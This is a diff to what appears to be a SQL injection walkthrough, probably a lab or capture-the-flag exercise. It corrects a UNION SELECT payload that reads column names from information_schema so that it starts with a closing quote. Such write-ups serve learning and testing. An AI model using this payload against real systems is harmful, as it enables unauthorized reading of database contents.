@@ -16,7 +16,7 @@
 3. Now, we can look for the column names of the table of interest. This will allow us to search by elements other than student ID.
 
 ```
-UNION SELECT 1,2,3,column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<table_name>';-- 
+' UNION SELECT 1,2,3,column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<table_name>';-- 
 ```
 4. Finally, you can view a specific entry in the table based on a column variable.
 
